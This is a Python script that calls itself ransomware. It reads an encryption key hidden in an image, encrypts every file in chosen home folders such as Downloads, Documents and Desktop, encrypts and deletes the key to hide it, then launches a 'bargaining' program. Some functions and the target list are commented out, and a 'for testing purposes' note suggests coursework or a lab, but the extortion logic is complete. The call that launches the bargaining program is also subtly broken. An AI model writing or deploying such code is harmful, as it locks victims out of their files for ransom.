#import os
#from cryptography.fernet import Fernet
#from extract import extract_file


'''def encrypt_file(filename: str, key: str):
    """
    Encrypts a single file provided the path of the file and the Fernet key to encrypt it.
    :param filename: Represents the file to undergo encryption
    :param key: Represents an instance of the Fernet Class created with a key.
    :return: None
    """
    # Converts that key to a Fernet object to gain access to Fernet methods
    f_key: Fernet = Fernet(key)
    # Assigns the data inside the unencrypted file to a variable
    with open(filename, "rb") as unencrypted_file:
        plaintext = unencrypted_file.read()
    # Encrypts the unencrypted data using the key and assigns the encrypted data to a variable
    ciphertext = f_key.encrypt(plaintext)
    # Overwrites the same file
    with open(filename, "wb") as encrypted_file:
        encrypted_file.write(ciphertext)'''


'''def process_directory(directory: str, key: str, blacklist: list[str]):
    """
    This function processes each directory, encrypting files that are not in the blacklist.
    :param directory: Represents the path to a directory that will have its files encrypted.
    :param key:
    :param blacklist:
    :return: None
    """
    # Unpacks the provided directory as a 3-tuple consisting of directory path, directory names, and file names
    for root, dir, files in os.walk(directory):
        # Ensures that the program doesn't accidentally encrypt itself!
        for directory in blacklist:
            if directory in dir:
                dir.remove(directory)
        # Iterates through each file in the directory
        for file in files:
            if file not in blacklist:
                # Combines the path of the directory with the file name to create filepath of file
                file_path = os.path.join(root, file)
                # Encrypts the file given the newly generated filepath
                encrypt_file(file_path, key)
                print(file)'''


def main():
    # Extracts the key from a specified image
    # TODO: Update the name of the images as needed
    with open ("images.txt", "r") as file:
        lines = file.readlines()
        image_containing_key: str = lines[0].strip("\n")

    try:
        if os.path.exists(image_containing_key):
            pass
        else:
            raise FileNotFoundError(f"The image name/path '{image_containing_key}' does not exist in the current directory."
                                    f"Either the name fed to the variable in the code to be updated or the image "
                                    f"specified just doesn't exist.")
    except FileNotFoundError as fnfe:
        print(f"File Not Found: {fnfe}")
        return
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return

    with open("passphrase.txt", "r") as file:
        lines = file.readlines()
        passphrase = lines[0].strip("\n")
    key: str = extract_file(image_containing_key, passphrase)

    # Represents folders to avoid encrypting for safety of host computer whilst maintaining functionality
    # of the ransomware.
    # TODO: Verify, but SHOULD prevent the code from encrypting itself
    blacklist: list[str] = [os.getcwd()]

    # Directories to encrypt in their entirety
    # TODO: Update as needed for testing purposes
    directories_to_encrypt = [
        #os.path.expanduser("~/Downloads"),
        #os.path.expanduser("~/Documents"),
        #os.path.expanduser("~/Pictures"),
        #os.path.expanduser("~/Desktop")
    ]
    for directory in directories_to_encrypt:
        process_directory(directory, key, blacklist)

    print("Encryption successful!")

    # Encrypts and removes the key from the working directory to hide from sight
    encrypt_file(image_containing_key, key)
    os.remove(image_containing_key)

    # Runs the bargaining application
    if os.path.exists("bargain_with_user.py"):
        exec("bargain_with_user.py")
    elif os.path.exists("bargain_with_user.exe"):
        exec("bargain_with_user.exe")
    else:
        raise FileNotFoundError("Neither the .py nor the .exe file for bargaining with the user were found...")


main()